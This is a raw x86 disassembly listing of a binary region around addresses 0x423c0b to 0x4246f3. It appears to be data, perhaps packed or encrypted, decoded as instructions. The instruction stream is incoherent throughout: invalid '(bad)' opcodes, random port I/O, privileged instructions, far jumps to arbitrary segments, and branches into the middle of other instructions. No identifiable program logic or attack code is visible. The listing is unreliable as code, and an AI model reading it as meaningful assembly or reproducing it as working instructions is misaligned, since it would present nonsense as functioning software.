  423c0b:	div    BYTE PTR [ecx+eax*2]
  423c0e:	out    0x6d,eax
  423c10:	ja     0x423c12
	...
  423c72:	add    BYTE PTR [eax],al
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x3e446617]
  423c81:	xchg   BYTE PTR [edx],bl
  423c83:	sbb    eax,0x17e29
  423c88:	add    eax,0x3000001
  423c8d:	inc    esi
  423c8e:	cs sbb dl,cl
  423c91:	jmp    0x423cef
  423c93:	outs   dx,DWORD PTR ds:[esi]
  423c94:	in     al,0xbf
  423c96:	scas   eax,DWORD PTR es:[edi]
  423c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c98:	cld    
  423c99:	mov    ch,0x20
  423c9b:	es xchg ebp,eax
  423c9d:	mov    edx,DWORD PTR [edx+0x478e691]
  423ca3:	inc    edx
  423ca4:	xor    esi,ebp
  423ca6:	adc    cl,BYTE PTR [esi]
  423ca8:	fstp   QWORD PTR ds:0xd89fe00
  423cae:	cmp    BYTE PTR [esi-0x4d],0xe1
  423cb2:	and    eax,0x449f9673
  423cb7:	jne    0x423cc6
  423cb9:	ret    
  423cba:	test   BYTE PTR [ecx],ah
  423cbc:	sbb    esp,DWORD PTR [ebp-0x39]
  423cbf:	in     eax,0x53
  423cc1:	and    DWORD PTR [ecx+0x1a],esi
  423cc4:	(bad)  
  423cc5:	mov    edi,0x99bf5845
  423cca:	addr16 xchg esi,ebp
  423ccd:	retf   
  423cce:	out    0x76,eax
  423cd0:	mov    al,ds:0x2d264f57
  423cd5:	outs   dx,DWORD PTR ds:[esi]
  423cd6:	or     BYTE PTR [ebx-0x21c9fc3f],0xf4
  423cdd:	jmp    0x7ce9:0x175e1825
  423ce4:	in     al,0x4e
  423ce6:	and    BYTE PTR [edi-0x24],0xc2
  423cea:	mov    eax,0x84ebdc44
  423cef:	test   al,0xb7
  423cf1:	les    ebx,FWORD PTR [edx]
  423cf3:	call   0xdea:0x55eaf812
  423cfa:	push   ebx
  423cfb:	in     al,dx
  423cfc:	lods   eax,DWORD PTR ds:[esi]
  423cfd:	pop    ds
  423cfe:	pop    ss
  423cff:	xchg   BYTE PTR [edi-0x5f],dh
  423d02:	in     eax,dx
  423d03:	rcr    BYTE PTR [edx+0x75943c73],1
  423d09:	add    al,0xa8
  423d0b:	pop    esi
  423d0c:	hlt    
  423d0d:	inc    edx
  423d0e:	adc    al,BYTE PTR [ebx+0x7a]
  423d11:	ins    BYTE PTR es:[edi],dx
  423d12:	mov    eax,ds:0x92f18f50
  423d17:	inc    edx
  423d18:	lock xor ebp,DWORD PTR [esi+0x112011e1]
  423d1f:	pop    ebp
  423d20:	xor    eax,0x7ade6f29
  423d25:	sbb    eax,0x5f94fc3c
  423d2a:	sbb    eax,0xb7ee927a
  423d2f:	ins    DWORD PTR es:[edi],dx
  423d30:	lahf   
  423d31:	push   es
  423d32:	shl    BYTE PTR [ecx-0x6edef08],1
  423d38:	jmp    0xc547:0xf840ca2f
  423d3f:	sub    DWORD PTR [edi-0x1edb016],0xffffff9d
  423d46:	scas   al,BYTE PTR es:[edi]
  423d47:	jmp    0x1f4506af
  423d4c:	pop    ds
  423d4d:	sbb    BYTE PTR [ebx-0x70],ah
  423d50:	mov    eax,0xd8d00811
  423d55:	mov    bh,cl
  423d57:	add    BYTE PTR [esi],dl
  423d59:	or     BYTE PTR [ecx+0x1997f25e],dh
  423d5f:	dec    ecx
  423d60:	xor    esp,DWORD PTR [edx-0x4]
  423d63:	xchg   esp,eax
  423d64:	shr    BYTE PTR ds:0xce6c724,0x8c
  423d6b:	xchg   ebx,ecx
  423d6d:	dec    ebx
  423d6e:	dec    ecx
  423d6f:	adc    BYTE PTR [edi],0x93
  423d72:	scas   al,BYTE PTR es:[edi]
  423d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d74:	cmc    
  423d75:	out    0x6f,eax
  423d77:	ss pop ebp
  423d79:	aas    
  423d7a:	inc    esp
  423d7b:	and    ah,BYTE PTR [edi]
  423d7d:	jecxz  0x423d31
  423d7f:	test   eax,0x35a0d892
  423d84:	data16 jns 0x423d7e
  423d87:	push   edx
  423d88:	xor    edx,DWORD PTR [edx]
  423d8a:	mov    DWORD PTR [edi+0x6d],0x3467abde
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x1cb5e92e],esp
  423e03:	hlt    
  423e04:	cs jg  0x423e08
  423e07:	add    BYTE PTR ds:0x6000001,al
  423e0d:	ds daa 
  423e0f:	lea    ebp,[eax+0x2e]
  423e12:	jg     0x423dea
  423e14:	or     eax,0xe67b947c
  423e19:	jge    0x423e74
  423e1b:	or     al,0x99
  423e1d:	mov    ebp,0xa0132b0
  423e22:	aaa    
  423e23:	out    0xe9,eax
  423e25:	or     eax,0x4649667
  423e2a:	sbb    eax,0x23efd8c5
  423e2f:	mov    dl,ch
  423e31:	push   ebp
  423e32:	xchg   edi,eax
  423e33:	div    BYTE PTR [ebx+0x66]
  423e36:	xor    edi,DWORD PTR [ebx-0x1800ce26]
  423e3c:	dec    ebp
  423e3d:	mov    al,ds:0x1ce561c0
  423e42:	inc    edx
  423e43:	test   al,0xa
  423e45:	jecxz  0x423e45
  423e47:	mov    eax,0xd14e47b2
  423e4c:	call   0x3e254321
  423e51:	hlt    
  423e52:	mov    BYTE PTR [esi-0x1d],dh
  423e55:	sub    edi,DWORD PTR [eax-0x1064ef]
  423e5b:	les    esp,FWORD PTR [edx-0x4781d945]
  423e61:	sar    DWORD PTR [ebp-0x6c],0xd7
  423e65:	or     eax,0x8e268641
  423e6a:	fs inc ebx
  423e6c:	push   0x42
  423e6e:	cmp    eax,0xbb811ccc
  423e73:	jge    0x423e02
  423e75:	mov    ebp,0x99952308
  423e7a:	cmp    DWORD PTR [esi+0x39],edx
  423e7d:	jg     0x423e19
  423e7f:	jmp    0x423e05
  423e81:	push   esp
  423e82:	icebp  
  423e83:	jg     0x423efc
  423e85:	mov    ah,0x3c
  423e87:	jmp    0x7be3a690
  423e8c:	ins    BYTE PTR es:[edi],dx
  423e8d:	shl    BYTE PTR [ebx-0x46],1
  423e90:	ror    eax,0xe8
  423e93:	or     cl,BYTE PTR [eax+0x2b6b80fe]
  423e99:	jmp    0x423e47
  423e9b:	adc    BYTE PTR [eax+0x55],dl
  423e9e:	imul   DWORD PTR [ecx]
  423ea0:	push   esi
  423ea1:	mov    esp,esi
  423ea3:	les    ebx,FWORD PTR [esi-0x3aac9c49]
  423ea9:	push   eax
  423eaa:	add    eax,0x1365effc
  423eaf:	sbb    dl,ah
  423eb1:	inc    eax
  423eb2:	(bad)  
  423eb3:	and    eax,0x1b7e374c
  423eb8:	mov    dl,bl
  423eba:	cmp    BYTE PTR [ecx+0x7e4d8f99],bl
  423ec0:	lock and cl,bh
  423ec3:	mov    cl,al
  423ec5:	mov    edx,es
  423ec7:	repnz sbb BYTE PTR [ebx+0x59eef8cf],ch
  423ece:	clc    
  423ecf:	cmp    al,0x55
  423ed1:	(bad)  
  423ed2:	xchg   esi,eax
  423ed3:	or     edx,DWORD PTR [ecx+0x345fc5c5]
  423ed9:	jae    0x423eca
  423edb:	call   0xd7231180
  423ee0:	shr    ebx,0x5d
  423ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ee4:	sub    dh,ah
  423ee6:	xchg   edx,eax
  423ee7:	sti    
  423ee8:	cmc    
  423ee9:	rcl    dh,cl
  423eeb:	add    bl,BYTE PTR [edx+0x37]
  423eee:	out    0x34,al
  423ef0:	imul   edi,DWORD PTR [ecx-0x79],0xffffffee
  423ef4:	jno    0x423f43
  423ef6:	cdq    
  423ef7:	add    DWORD PTR [ecx-0x5f6afc78],ebx
  423efd:	mov    edi,0x9970314f
  423f02:	in     eax,0x23
  423f04:	lods   eax,DWORD PTR ds:[esi]
  423f05:	mov    esi,0x2a59ae33
  423f0a:	shl    DWORD PTR [edx+0x2a],0x13
  423f0e:	mov    ebx,0x36d3
	...
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	and    DWORD PTR ds:0x8033fe62,eax
  423f86:	add    DWORD PTR [eax],eax
  423f88:	add    eax,0x3b000001
  423f8d:	add    edx,DWORD PTR [ebx+0x2e]
  423f90:	icebp  
  423f91:	sub    DWORD PTR [eax],ecx
  423f93:	push   esp
  423f94:	jle    0x423fda
  423f96:	or     bh,BYTE PTR [esp+eax*2+0x42dc7d7c]
  423f9d:	cdq    
  423f9e:	das    
  423f9f:	inc    ecx
  423fa0:	push   edi
  423fa1:	daa    
  423fa2:	inc    eax
  423fa3:	or     BYTE PTR [ecx],al
  423fa5:	push   ss
  423fa6:	in     al,dx
  423fa7:	xor    ch,bl
  423fa9:	stos   BYTE PTR es:[edi],al
  423faa:	sar    DWORD PTR [ecx+ecx*1],1
  423fad:	dec    edi
  423fae:	test   eax,0x4f781164
  423fb3:	dec    eax
  423fb4:	mov    bh,0x53
  423fb6:	outs   dx,BYTE PTR ds:[esi]
  423fb7:	pusha  
  423fb8:	and    ah,BYTE PTR [eax]
  423fba:	(bad)  
  423fbc:	sbb    eax,0xa5526f2b
  423fc1:	push   ebx
  423fc2:	ja     0x423fce
  423fc4:	ret    0xcec0
  423fc7:	(bad)  
  423fc8:	sar    DWORD PTR [edx-0x1d],1
  423fcb:	push   ecx
  423fcc:	adc    eax,0xca211f86
  423fd1:	push   ecx
  423fd2:	les    eax,FWORD PTR [ecx]
  423fd4:	aas    
  423fd5:	add    al,0x23
  423fd7:	(bad)  
  423fd8:	jae    0x423fab
  423fda:	dec    edi
  423fdb:	inc    ebp
  423fdc:	xchg   ebx,eax
  423fdd:	sub    DWORD PTR [ebx-0x48bc6e0b],ecx
  423fe3:	cwde   
  423fe4:	(bad)  
  423fe5:	retf   0x1432
  423fe8:	out    0x7d,al
  423fea:	sub    BYTE PTR [ebx-0x6ac84a4e],0x36
  423ff1:	cmp    al,0x17
  423ff3:	imul   edx,edi,0x40
  423ff6:	mov    bl,0x5
  423ff8:	mov    dh,0x16
  423ffa:	xchg   ecx,eax
  423ffb:	add    cl,BYTE PTR [ebp+0x3ebc8dc5]
  424001:	xchg   al,al
  424003:	and    cl,ch
  424005:	push   cs
  424006:	push   0xa1365e2f
  42400b:	jl     0x423fff
  42400d:	out    0x44,eax
  42400f:	jo     0x424049
  424011:	mov    ss,WORD PTR [ebx]
  424013:	rcr    DWORD PTR [esi-0xd],1
  424016:	fnstenv [ecx+edx*8]
  424019:	fnstenv [edi+0x51d28eba]
  42401f:	cmp    DWORD PTR [ebp-0x16],esp
  424022:	add    al,0x6a
  424024:	sub    cl,BYTE PTR [ebx]
  424026:	out    dx,eax
  424027:	sbb    dl,al
  424029:	inc    eax
  42402a:	int3   
  42402b:	ret    0xb9a5
  42402e:	aam    0x17
  424030:	arpl   WORD PTR [si],bp
  424033:	int3   
  424034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424035:	test   DWORD PTR [ecx+0x64877bf9],edx
  42403b:	popa   
  42403c:	cmc    
  42403d:	pop    esi
  42403e:	sbb    al,0xb
  424040:	and    DWORD PTR [ebx+0x2f],edx
  424043:	pop    ds
  424044:	fmulp  st(7),st
  424046:	mov    BYTE PTR [edx],bh
  424048:	xchg   DWORD PTR [edi-0x2a8658fc],ecx
  42404e:	xchg   ecx,eax
  42404f:	fwait
  424050:	xor    al,0x1c
  424052:	retf   
  424053:	sub    eax,DWORD PTR [eax-0x1432ce60]
  424059:	mov    dh,0xd2
  42405b:	mov    edi,0x47daf00
  424060:	pop    eax
  424061:	cmp    DWORD PTR [edx],0x26b80db4
  424067:	shr    DWORD PTR [edx-0x3e],cl
  42406a:	rcl    DWORD PTR [ebx+0x35],cl
  42406d:	push   edi
  42406e:	or     cl,al
  424070:	jno    0x4240ac
  424072:	mov    edi,0x928aabc6
  424077:	ja     0x42405d
  424079:	(bad)  
  42407a:	xchg   ebx,eax
  42407b:	dec    ecx
  42407c:	inc    edi
  42407d:	pop    edi
  42407e:	push   eax
  42407f:	push   edi
  424080:	mov    ecx,0xd0184c13
  424085:	or     al,BYTE PTR [esi+ecx*4]
  424088:	dec    esp
  424089:	scas   eax,DWORD PTR es:[edi]
  42408a:	and    al,0x44
  42408c:	in     al,0x6d
  42408e:	in     eax,dx
  42408f:	fcmove st,st(4)
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	mov    esi,ebp
  424102:	and    BYTE PTR [ebx+0x18138],ah
  424108:	add    eax,0x72000001
  42410d:	push   edx
  42410e:	fwait
  42410f:	push   0xfffffff7
  424111:	sub    DWORD PTR [esi],ebp
  424113:	pop    ebx
  424114:	or     bh,al
  424116:	and    DWORD PTR [eax],0x31
  424119:	push   ebp
  42411a:	data16 jmp 0x424140
  42411d:	and    DWORD PTR [edi+0x3e],ebx
  424120:	mov    bl,BYTE PTR [edi-0x18c10754]
  424126:	bnd ret 0x8a70
  42412a:	mov    eax,ds:0xdc5a2b2
  42412f:	jle    0x424145
  424131:	ror    BYTE PTR [edx+ebx*4+0x68586320],1
  424138:	push   ss
  424139:	cs mov ecx,0xff2bc8dc
  42413f:	cmp    DWORD PTR [esi+0x7a484afe],ebp
  424145:	retf   
  424146:	(bad)  
  424147:	mov    esi,0x5e8b676e
  42414c:	jo     0x424161
  42414e:	imul   edx,DWORD PTR [ebp+0x7a0c8942],0xffffffbc
  424155:	mov    edi,ebp
  424157:	push   eax
  424158:	scas   al,BYTE PTR es:[edi]
  424159:	icebp  
  42415a:	mov    ch,0x67
  42415c:	adc    ch,BYTE PTR [edx-0x1b]
  42415f:	mov    eax,DWORD PTR [eax]
  424161:	sub    BYTE PTR [edx+0x691813de],0xf9
  424168:	xchg   BYTE PTR [esi+0x3453f732],ah
  42416e:	pop    ds
  42416f:	cwde   
  424170:	imul   ebp,ebp,0xc46e6cab
  424176:	ja     0x42414d
  424178:	nop
  424179:	add    al,bh
  42417b:	inc    edi
  42417c:	in     eax,0x59
  42417e:	add    al,0xc8
  424180:	scas   al,BYTE PTR es:[edi]
  424181:	cmc    
  424182:	pop    ds
  424183:	cld    
  424184:	jle    0x42410c
  424186:	adc    ecx,0xffffff9a
  424189:	or     edi,DWORD PTR [edx+0x2]
  42418c:	test   eax,0xcb041dce
  424191:	nop
  424192:	dec    ecx
  424193:	or     al,BYTE PTR [ecx-0x34a8b0e5]
  424199:	xor    BYTE PTR [edx],cl
  42419b:	test   DWORD PTR [esp+ecx*4+0x7325f342],0xe3700926
  4241a6:	jb     0x424211
  4241a8:	sub    DWORD PTR [eax+edi*8+0x52],edx
  4241ac:	(bad)  
  4241ad:	shr    BYTE PTR [edi],cl
  4241af:	retf   
  4241b0:	test   eax,0x60c26989
  4241b5:	aam    0xaa
  4241b7:	push   ebp
  4241b8:	enter  0xcc47,0xd8
  4241bc:	aaa    
  4241bd:	clc    
  4241be:	lea    edi,[ecx-0x4b]
  4241c1:	ja     0x424179
  4241c3:	pop    esp
  4241c4:	jne    0x424146
  4241c6:	call   0x1174:0x6b8e81a4
  4241cd:	dec    ebx
  4241ce:	pop    edx
  4241cf:	mov    eax,0xe921e1ae
  4241d4:	pop    es
  4241d5:	ss je  0x4241af
  4241d8:	inc    eax
  4241d9:	xchg   BYTE PTR [ebp+0x25ca86ea],dl
  4241df:	bswap  edi
  4241e1:	adc    BYTE PTR cs:[eax],ah
  4241e4:	ins    BYTE PTR es:[edi],dx
  4241e5:	clc    
  4241e6:	jmp    FWORD PTR [ebx-0x3f6bcf6d]
  4241ec:	push   edi
  4241ed:	out    dx,eax
  4241ee:	mov    ebx,0xef2fa08e
  4241f3:	(bad)  
  4241f4:	repz clc 
  4241f6:	add    DWORD PTR [eax+0x79],ebx
  4241f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241fa:	pop    es
  4241fb:	push   ecx
  4241fc:	jb     0x424244
  4241fe:	mov    al,cl
  424200:	jno    0x42423a
  424202:	mov    ebp,0x50cbfb25
  424207:	adc    bh,BYTE PTR [ecx+0x7d9f0719]
  42420d:	shl    DWORD PTR [ebx+0x26f7],0x0
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	aas    
  424281:	jl     0x424270
  424283:	jmp    0x43c4c5
  424288:	add    eax,0xd000001
  42428d:	dec    DWORD PTR [ebp+0x4a]
  424290:	mov    dh,0x7c
  424292:	push   esi
  424293:	aaa    
  424294:	mov    esp,0x6361169a
  424299:	pop    esp
  42429a:	ins    BYTE PTR es:[edi],dx
  42429b:	cmp    al,0xf9
  42429d:	adc    DWORD PTR [ecx+0xb9fd0c9],ebx
  4242a3:	in     al,0x40
  4242a5:	ret    0xe9a2
  4242a8:	push   0x7b
  4242aa:	mov    ebp,0x4b689d32
  4242af:	jb     0x424251
  4242b1:	push   ebp
  4242b2:	ss (bad) 
  4242b4:	jae    0x42423d
  4242b6:	xchg   ah,dh
  4242b8:	add    al,0x47
  4242ba:	enter  0x99,0xb
  4242be:	push   ds
  4242bf:	je     0x42425c
  4242c1:	in     al,dx
  4242c2:	xor    DWORD PTR [edi-0x204324d5],0xe6f09fce
  4242cc:	fnstcw WORD PTR [edx+0x1102ace8]
  4242d2:	sub    DWORD PTR [eax],edi
  4242d4:	adc    al,0xf3
  4242d6:	pop    edx
  4242d7:	add    BYTE PTR [edx+eax*1],cl
  4242da:	sbb    al,0xf6
  4242dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242dd:	scas   al,BYTE PTR es:[edi]
  4242de:	bound  ecx,QWORD PTR [edi+0x28d14ab]
  4242e4:	mov    ah,BYTE PTR [ebx]
  4242e6:	sub    al,0xe9
  4242e8:	aad    0xf3
  4242ea:	jp     0x424305
  4242ec:	cli    
  4242ed:	push   ecx
  4242ee:	pop    esi
  4242ef:	xor    esi,eax
  4242f1:	out    0xec,eax
  4242f3:	lods   al,BYTE PTR ds:[esi]
  4242f4:	jge    0x4242d2
  4242f6:	add    dh,BYTE PTR [eax]
  4242f8:	fmul   DWORD PTR [ebx-0x8]
  4242fb:	fmul   DWORD PTR [eax+0x4c]
  4242fe:	imul   eax,DWORD PTR [ecx+0x39],0xa418d75
  424305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424306:	ins    BYTE PTR es:[edi],dx
  424307:	add    DWORD PTR [ecx-0x6a6be3db],ebx
  42430d:	out    0xce,eax
  42430f:	or     DWORD PTR [eax-0x58],0x3e
  424313:	fcmovnbe st,st(3)
  424315:	sbb    al,0xf3
  424317:	sub    eax,0xab098689
  42431c:	daa    
  42431d:	std    
  42431e:	push   edx
  42431f:	rcl    DWORD PTR [ebx],0xdf
  424322:	jmp    0x13aa:0x8d1e8c30
  424329:	or     BYTE PTR [ebx],al
  42432b:	enter  0x3f43,0x70
  42432f:	repz inc edx
  424331:	xor    edi,esp
  424333:	sbb    DWORD PTR [esi-0x42],edi
  424336:	add    eax,0x20a1f30b
  42433b:	sbb    bl,BYTE PTR ds:0x1c9323a0
  424341:	js     0x424364
  424343:	inc    edi
  424344:	popf   
  424345:	jecxz  0x424382
  424347:	jb     0x424332
  424349:	test   BYTE PTR [edi],dh
  42434b:	loopne 0x4243b4
  42434d:	stos   BYTE PTR es:[edi],al
  42434e:	dec    ecx
  42434f:	loope  0x4243ab
  424351:	xor    esi,DWORD PTR [ecx]
  424353:	fisub  DWORD PTR [edx]
  424355:	pop    esi
  424356:	out    dx,al
  424357:	mov    dh,0x4b
  424359:	jae    0x42436f
  42435b:	push   ebx
  42435c:	popf   
  42435d:	or     dl,dh
  42435f:	mov    cl,0xc5
  424361:	sub    bl,BYTE PTR [edi-0x53]
  424364:	and    ebp,DWORD PTR [edx-0x18]
  424367:	int3   
  424368:	mov    esp,0x6b362d9d
  42436d:	ins    DWORD PTR es:[edi],dx
  42436e:	push   esp
  42436f:	(bad)  
  424370:	or     al,0x1f
  424372:	aad    0x1
  424374:	arpl   WORD PTR [ebp+0x4be0259c],si
  42437a:	inc    ebp
  42437b:	push   cs
  42437c:	push   edi
  42437d:	pop    esp
  42437e:	jnp    0x4243d7
  424380:	cmp    edx,DWORD PTR [edx-0x325c147a]
  424386:	xchg   edx,eax
  424387:	or     ch,bl
  424389:	(bad)  
  42438a:	nop
  42438b:	xor    al,0xf0
  42438d:	loope  0x42436d
  42438f:	(bad)  
  424390:	mov    ebp,0x0
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42447f
  424401:	dec    edi
  424402:	repz clc 
  424404:	inc    edx
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0xe5000001
  42440d:	dec    ecx
  42440e:	pop    ss
  42440f:	mov    dh,0x34
  424411:	fnstenv [esi]
  424413:	fsub   QWORD PTR [ecx-0x56fd50f5]
  424419:	and    ch,BYTE PTR [esp+esi*1]
  42441c:	fisubr WORD PTR [edi]
  42441e:	jne    0x424436
  424420:	leave  
  424421:	push   ecx
  424422:	inc    esp
  424423:	jno    0x4243ca
  424425:	rcl    DWORD PTR [ebp+0x9],1
  424428:	jns    0x4243b8
  42442a:	addr16 jno 0x424451
  42442d:	jmp    0x2c1a5682
  424432:	test   DWORD PTR [ebp-0x305f080],ecx
  424438:	pop    ds
  424439:	xchg   edx,eax
  42443a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42443b:	ucomiss xmm5,DWORD PTR [edi+0x1fc2533e]
  424442:	(bad)  
  424443:	(bad)  
  424444:	or     cl,BYTE PTR gs:[esi]
  424447:	ds mov ah,0x6d
  42444a:	test   al,0x10
  42444c:	arpl   WORD PTR [ebp-0x909c207],sp
  424452:	(bad)  
  424454:	enter  0xd5ed,0x1c
  424458:	sbb    al,0x4d
  42445a:	and    eax,0x9e81ae6
  42445f:	push   esp
  424460:	daa    
  424461:	out    0x18,eax
  424463:	idiv   BYTE PTR [ebp+0x1b]
  424466:	ret    0x70ed
  424469:	adc    DWORD PTR [ebx],0x96111e6a
  42446f:	sub    eax,0x1c6d11b6
  424474:	sub    eax,eax
  424476:	call   0x6d13f2d
  42447b:	fs cs and eax,0x8875139e
  424482:	cmc    
  424483:	ins    BYTE PTR es:[edi],dx
  424484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424485:	jp     0x42447a
  424487:	(bad)  
  424488:	xchg   ebp,eax
  424489:	lods   eax,DWORD PTR ds:[esi]
  42448a:	sbb    bl,ch
  42448c:	lods   al,BYTE PTR ds:[esi]
  42448d:	add    ah,bl
  42448f:	sub    eax,0xeb8adf9e
  424494:	add    DWORD PTR [ebp-0x72c6a9f3],edi
  42449a:	mov    edi,0x770b9c85
  42449f:	sub    cl,BYTE PTR ds:[edi-0x49]
  4244a3:	sbb    eax,0x25e5cc9d
  4244a8:	dec    esi
  4244a9:	and    BYTE PTR [ebp-0x93582cd],dh
  4244af:	dec    ebp
  4244b0:	xchg   ecx,eax
  4244b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244b2:	xlat   BYTE PTR ds:[ebx]
  4244b3:	in     al,dx
  4244b4:	and    al,bl
  4244b6:	or     bh,BYTE PTR [ebx+0x4e]
  4244b9:	(bad)
  4244bc:	pop    eax
  4244bd:	pop    esp
  4244be:	xchg   esp,eax
  4244bf:	xchg   edi,eax
  4244c0:	cmp    al,0x39
  4244c2:	sub    edi,DWORD PTR [edi+eax*2-0x14]
  4244c6:	clc    
  4244c7:	cmp    BYTE PTR [ecx+0x72],ah
  4244ca:	retf   0x9ada
  4244cd:	es (bad) 
  4244d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244d1:	mov    ss,WORD PTR [eax-0x1f14a029]
  4244d7:	int    0x13
  4244d9:	in     al,dx
  4244da:	pop    ebp
  4244db:	sub    ah,bh
  4244dd:	das    
  4244de:	adc    BYTE PTR [edi],cl
  4244e0:	xchg   esp,eax
  4244e1:	iret   
  4244e2:	pop    ds
  4244e3:	mul    BYTE PTR [ebx+0x69a440a5]
  4244e9:	sub    BYTE PTR [esp+edx*1+0x3ac0d1d4],cl
  4244f0:	pop    edi
  4244f1:	and    eax,0xd409b673
  4244f6:	mov    eax,ds:0xdc8e41df
  4244fb:	cwde   
  4244fc:	gs jns 0x4244b0
  4244ff:	jns    0x4244e2
  424501:	inc    edi
  424502:	sub    al,0x77
  424504:	scas   eax,DWORD PTR es:[edi]
  424505:	push   0x5a675d6f
  42450a:	mov    cl,0x1
  42450c:	and    ah,BYTE PTR [ebp+edi*1-0x36]
  424510:	aad    0x0
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x69],1
  424581:	push   ecx
  424582:	leave  
  424583:	adc    DWORD PTR [edi-0x7c],eax
  424586:	add    DWORD PTR [eax],eax
  424588:	add    eax,0xe0000001
  42458d:	cmc    
  42458e:	test   DWORD PTR [eax],edi
  424590:	loop   0x424550
  424592:	mov    bl,0x32
  424594:	dec    ebx
  424595:	mov    al,0xfc
  424597:	loope  0x4245d5
  424599:	test   eax,0x76318dcc
  42459e:	in     al,0x6c
  4245a0:	js     0x42455a
  4245a2:	mov    bh,0xeb
  4245a4:	bound  eax,QWORD PTR [edx]
  4245a6:	int3   
  4245a7:	xchg   ebx,eax
  4245a8:	mov    ecx,0x410e8c84
  4245ad:	repz into 
  4245af:	fstp   DWORD PTR [edx-0x24]
  4245b2:	sbb    bh,BYTE PTR [ebx-0x43c4bbe0]
  4245b8:	cwde   
  4245b9:	xchg   edx,eax
  4245ba:	xchg   esi,eax
  4245bb:	cmp    ebx,edx
  4245bd:	ds pusha 
  4245bf:	aad    0xce
  4245c1:	pop    esp
  4245c2:	and    DWORD PTR [edx],0xffffffc6
  4245c5:	mov    esp,0x5258738e
  4245ca:	cli    
  4245cb:	ret    0x331c
  4245ce:	jp     0x4245b3
  4245d0:	sub    DWORD PTR ds:[ebx],eax
  4245d3:	sbb    eax,0x8f6731da
  4245d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245d9:	jnp    0x4245ac
  4245db:	enter  0x21ba,0x6b
  4245df:	shl    DWORD PTR [esi+edx*8],0x3c
  4245e3:	or     eax,0xb68a5568
  4245e8:	ja     0x424610
  4245ea:	mov    bl,0x75
  4245ec:	push   ds
  4245ed:	scas   eax,DWORD PTR es:[edi]
  4245ee:	adc    eax,0xe81acc68
  4245f3:	lods   eax,DWORD PTR ds:[esi]
  4245f4:	inc    ebx
  4245f5:	xchg   ecx,eax
  4245f6:	stos   DWORD PTR es:[edi],eax
  4245f7:	stos   DWORD PTR es:[edi],eax
  4245f8:	mov    bh,0x7f
  4245fa:	inc    ecx
  4245fb:	cmp    BYTE PTR [ebx+0x38],dl
  4245fe:	out    0x0,eax
  424600:	int    0xc8
  424602:	sub    ebp,DWORD PTR ds:0x21aa8f22
  424608:	shr    eax,0xee
  42460b:	neg    ch
  42460d:	xchg   ebp,eax
  42460e:	pop    ds
  42460f:	ins    DWORD PTR es:[edi],dx
  424610:	push   cs
  424611:	cmp    dh,bh
  424613:	pop    eax
  424614:	push   es
  424615:	loope  0x424638
  424617:	adc    eax,0x1cb777c
  42461c:	lods   al,BYTE PTR ds:[esi]
  42461d:	mov    ebp,edx
  42461f:	aaa    
  424620:	sete   BYTE PTR ds:0x8ac65381
  424627:	jne    0x42460d
  424629:	int3   
  42462a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42462b:	repnz sub dh,al
  42462e:	adc    ecx,eax
  424630:	scas   eax,DWORD PTR es:[edi]
  424631:	mov    edi,0x84b17aca
  424636:	adc    bl,al
  424638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424639:	pop    esi
  42463a:	(bad)  
  42463b:	in     al,0xb4
  42463d:	jmp    0x42466e
  42463f:	ret    
  424640:	push   ds
  424641:	lock adc DWORD PTR ds:0xe687bdc7,edi
  424648:	mov    ebp,0xc22eaaa9
  42464d:	loopne 0x424697
  42464f:	sub    eax,0x298745f8
  424654:	shr    DWORD PTR [esi],1
  424656:	imul   ebx,eax,0x6ecefb59
  42465c:	rcl    ch,cl
  42465e:	add    bh,BYTE PTR [ebx+0x1d14aa1a]
  424664:	sub    edi,DWORD PTR [ecx+0x2a2fe176]
  42466a:	in     eax,0x28
  42466c:	xchg   esi,eax
  42466d:	gs lahf 
  42466f:	mov    ds:0x58413fcd,al
  424674:	aas    
  424675:	push   ebp
  424676:	xchg   ebx,eax
  424677:	(bad)
  42467b:	sub    BYTE PTR [eax+0xc1324ff],dl
  424681:	sub    BYTE PTR [eax],0x54
  424684:	mov    eax,0x65ccb143
  424689:	gs mov esi,0x9655e73e
  42468f:	mov    dl,0x7e
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
